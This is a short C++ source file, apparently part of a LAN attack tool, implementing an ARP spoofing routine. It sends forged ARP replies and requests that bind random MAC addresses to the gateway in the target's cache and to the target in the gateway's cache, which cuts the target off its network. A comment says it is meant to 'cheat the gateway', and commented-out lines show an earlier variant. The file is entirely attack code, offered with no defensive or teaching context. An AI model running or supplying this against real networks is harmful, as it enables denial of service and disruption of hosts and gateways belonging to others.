#include "arpattacker.h"
#include "LANAttacker/lanpcap.h"





void ArpAttacker::AttackBehaveImpl(const LANHostInfo &TargetHost)
{
    LANHostInfo GateHost= GetLANPCap()->GetGateWayHostInfo();


    //these code lead to self's arptable changed,can't use these method

  // GetLANPCap()->SendArpReplyPacket(GateHost.CreateRandomMacAddrHost(),TargetHost);
     // GetLANPCap()->SendArpRequestPacket(GateHost.CreateRandomIpAddrHost(),TargetHost);




    GetLANPCap()->SendArpReplyPacket(TargetHost,GateHost.CreateRandomMacAddrHost());

    //cheat the gateway
    GetLANPCap()->SendArpReplyPacket(TargetHost.CreateRandomMacAddrHost(),GateHost);
    GetLANPCap()->SendArpRequestPacket(TargetHost.CreateRandomMacAddrHost(),GateHost);




}


